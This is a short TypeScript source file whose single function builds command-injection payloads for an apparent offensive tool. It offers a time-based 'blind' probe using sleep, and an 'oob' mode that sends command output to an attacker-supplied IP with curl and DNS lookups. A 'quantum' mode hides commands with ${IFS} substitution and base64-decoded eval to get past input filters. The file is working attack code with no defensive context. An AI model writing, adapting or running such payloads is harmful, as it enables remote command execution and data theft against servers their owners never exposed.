export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string {
  if (!cmd) return "";
  const p = String(cmd);

  if (mode === "blind") {
    return `${p} && sleep 6`;
  }

  if (mode === "oob") {
    const b64 = Buffer.from(p).toString("base64");
    return `(${p}) 2>&1 | { read out; curl -sk "http://${attackerIp}/?d=$(echo "$out" | base64 -w0)" & nslookup "$(echo "$out" | head -c30 | tr -cd '[:alnum:]').oob.${attackerIp}" 2>/dev/null; }; echo ${b64} | base64 -d | sh`;
  }

  if (mode === "quantum") {
    const sanitized = p.replace(/ /g, "${IFS}");
    const b64 = Buffer.from(sanitized).toString("base64");
    return `eval "$(echo ${b64} | base64 -d)"`;
  }

  return p;
}
